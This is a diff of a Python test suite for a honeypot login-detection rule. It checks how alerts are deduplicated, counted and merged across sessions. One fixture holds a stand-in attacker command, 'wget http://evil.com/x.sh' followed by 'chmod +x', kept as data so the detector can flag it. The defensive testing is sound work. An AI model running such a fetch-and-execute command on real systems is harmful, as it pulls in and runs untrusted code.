@@ -27,21 +27,196 @@ def test_cowrie_login_no_success_no_alert(
     assert alerts == []
 
 
-def test_cowrie_login_dedup_key_is_session_scoped(
+def test_cowrie_login_same_ip_same_day_is_one_alert(
     make_cowrie_session, make_login_attempt
 ):
-    """dedup_key must be session-specific, not just src_ip-based — two
-    different sessions from the same IP must not collide/suppress
-    each other in engine.py's deduplicate_alerts()."""
-    attempt1 = make_login_attempt(success=True)
-    session1 = make_cowrie_session(session_id="sessA", login_attempts=[attempt1])
+    """Two sessions from the same IP on the same UTC day -> ONE alert.
+    dedup_key is '<ip>|<date>' (same shape as rule_001) so engine.py's
+    deduplicate_alerts() also keeps one per day across engine runs."""
+    session1 = make_cowrie_session(
+        session_id="sessA", login_attempts=[make_login_attempt(session_id="sessA")]
+    )
+    session2 = make_cowrie_session(
+        session_id="sessB", login_attempts=[make_login_attempt(session_id="sessB")]
+    )
 
-    attempt2 = make_login_attempt(success=True)
-    session2 = make_cowrie_session(session_id="sessB", login_attempts=[attempt2])
+    alerts = detect([session1, session2])
+    assert len(alerts) == 1
+    assert alerts[0].dedup_key == "45.33.32.156|2026-01-15"
+    assert alerts[0].extra["session_count"] == 2
+
+
+def test_cowrie_login_different_ips_get_separate_alerts(
+    make_cowrie_session, make_login_attempt
+):
+    """The IP is part of the key: two attackers must never suppress each other."""
+    session1 = make_cowrie_session(
+        session_id="sessA", src_ip="45.33.32.156",
+        login_attempts=[make_login_attempt(session_id="sessA")],
+    )
+    session2 = make_cowrie_session(
+        session_id="sessB", src_ip="8.137.150.84",
+        login_attempts=[make_login_attempt(session_id="sessB")],
+    )
 
     alerts = detect([session1, session2])
     assert len(alerts) == 2
-    assert alerts[0].dedup_key != alerts[1].dedup_key
+    assert {a.dedup_key for a in alerts} == {
+        "45.33.32.156|2026-01-15", "8.137.150.84|2026-01-15",
+    }
+
+
+def test_cowrie_login_same_ip_different_days_get_separate_alerts(
+    make_cowrie_session, make_login_attempt
+):
+    """A bot that returns the next day is news again: new UTC date, new alert."""
+    day1 = make_login_attempt(
+        session_id="sessA", timestamp=datetime(2026, 1, 15, 10, 0, 0, tzinfo=timezone.utc)
+    )
+    day2 = make_login_attempt(
+        session_id="sessB", timestamp=datetime(2026, 1, 16, 10, 0, 0, tzinfo=timezone.utc)
+    )
+    alerts = detect([
+        make_cowrie_session(session_id="sessA", login_attempts=[day1]),
+        make_cowrie_session(session_id="sessB", login_attempts=[day2]),
+    ])
+    assert [a.dedup_key for a in alerts] == [
+        "45.33.32.156|2026-01-15", "45.33.32.156|2026-01-16",
+    ]
+
+
+def test_cowrie_login_utc_midnight_splits_group(
+    make_cowrie_session, make_login_attempt
+):
+    """Sessions 20 seconds apart but on either side of UTC midnight land in
+    different days -> two alerts. Documents the (accepted) edge case."""
+    before = make_login_attempt(
+        session_id="sessA", timestamp=datetime(2026, 1, 15, 23, 59, 50, tzinfo=timezone.utc)
+    )
+    after = make_login_attempt(
+        session_id="sessB", timestamp=datetime(2026, 1, 16, 0, 0, 10, tzinfo=timezone.utc)
+    )
+    alerts = detect([
+        make_cowrie_session(session_id="sessA", login_attempts=[before]),
+        make_cowrie_session(session_id="sessB", login_attempts=[after]),
+    ])
+    assert len(alerts) == 2
+
+
+def test_cowrie_login_flood_collapses_to_one_alert(
+    make_cowrie_session, make_login_attempt
+):
+    """The 2026-11-13 incident in miniature: 500 sessions from one IP in one
+    batch -> ONE alert, saying 'at least 500', flagged as a lower bound."""
+    sessions = [
+        make_cowrie_session(
+            session_id=f"flood{n}",
+            src_ip="8.137.150.84",
+            login_attempts=[make_login_attempt(session_id=f"flood{n}")],
+        )
+        for n in range(500)
+    ]
+
+    alerts = detect(sessions)
+    assert len(alerts) == 1
+    assert alerts[0].extra["session_count"] == 500
+    assert alerts[0].extra["count_is_lower_bound"] is True
+    assert "at least 500 session(s)" in alerts[0].description
+    assert alerts[0].severity.name == "CRITICAL"
+
+
+def test_cowrie_login_failed_only_sessions_not_counted(
+    make_cowrie_session, make_login_attempt
+):
+    """A session with no successful login must not inflate the count or
+    create an alert of its own — only successes are 'got in'."""
+    ok1 = make_cowrie_session(
+        session_id="ok1", login_attempts=[make_login_attempt(session_id="ok1")]
+    )
+    ok2 = make_cowrie_session(
+        session_id="ok2", login_attempts=[make_login_attempt(session_id="ok2")]
+    )
+    failed = make_cowrie_session(
+        session_id="bad",
+        login_attempts=[make_login_attempt(session_id="bad", success=False)],
+    )
+
+    alerts = detect([ok1, failed, ok2])
+    assert len(alerts) == 1
+    assert alerts[0].extra["session_count"] == 2
+
+
+def test_cowrie_login_merges_flags_and_sums_counts_across_batch(
+    make_cowrie_session, make_login_attempt, make_cowrie_command
+):
+    """Within one batch: wget in session A and chmod +x in session B both
+    show on the single alert; attempt and command counts are summed."""
+    session_a = make_cowrie_session(
+        session_id="A",
+        login_attempts=[
+            make_login_attempt(session_id="A", success=False),
+            make_login_attempt(session_id="A", success=True),
+        ],
+        commands=[make_cowrie_command(session_id="A", input="wget http://evil.com/x.sh")],
+    )
+    session_b = make_cowrie_session(
+        session_id="B",
+        login_attempts=[make_login_attempt(session_id="B", success=True)],
+        commands=[
+            make_cowrie_command(session_id="B", input="chmod +x x.sh"),
+            make_cowrie_command(session_id="B", input="ls"),
+        ],
+    )
+
+    alerts = detect([session_a, session_b])
+    assert len(alerts) == 1
+    extra = alerts[0].extra
+    assert extra["download_tools"] == ["wget"]
+    assert extra["chmod_x_used"] is True
+    assert extra["login_attempt_count"] == 3
+    assert extra["command_count"] == 3
+
+
+def test_cowrie_login_time_window_spans_the_group(
+    make_cowrie_session, make_login_attempt
+):
+    """first_seen = earliest success in the group, last_seen = latest session end."""
+    early = make_login_attempt(
+        session_id="early", timestamp=datetime(2026, 1, 15, 8, 0, 0, tzinfo=timezone.utc)
+    )
+    late = make_login_attempt(
+        session_id="late", timestamp=datetime(2026, 1, 15, 20, 0, 0, tzinfo=timezone.utc)
+    )
+    session_early = make_cowrie_session(session_id="early", login_attempts=[early])
+    session_late = make_cowrie_session(session_id="late", login_attempts=[late]).model_copy(
+        update={"end_time": datetime(2026, 1, 15, 20, 5, 0, tzinfo=timezone.utc)}
+    )
+
+    alerts = detect([session_early, session_late])
+    assert alerts[0].first_seen == datetime(2026, 1, 15, 8, 0, 0, tzinfo=timezone.utc)
+    assert alerts[0].last_seen == datetime(2026, 1, 15, 20, 5, 0, tzinfo=timezone.utc)
+
+
+def test_cowrie_login_input_order_does_not_change_the_alert(
+    make_cowrie_session, make_login_attempt
+):
+    """The 'first' session is chosen by timestamp, not list position, so the
+    same data in any order gives the same credentials and first_session_id."""
+    early = make_login_attempt(
+        session_id="early", username="root", password="toor",
+        timestamp=datetime(2026, 1, 15, 8, 0, 0, tzinfo=timezone.utc),
+    )
+    late = make_login_attempt(
+        session_id="late", username="admin", password="admin",
+        timestamp=datetime(2026, 1, 15, 9, 0, 0, tzinfo=timezone.utc),
+    )
+    session_early = make_cowrie_session(session_id="early", login_attempts=[early])
+    session_late = make_cowrie_session(session_id="late", login_attempts=[late])
+
+    forward = detect([session_early, session_late])[0]
+    backward = detect([session_late, session_early])[0]
+    assert forward.username == backward.username == "root"
+    assert forward.extra["first_session_id"] == backward.extra["first_session_id"] == "early"
 
 
 def test_cowrie_login_multiple_attempts_one_alert(
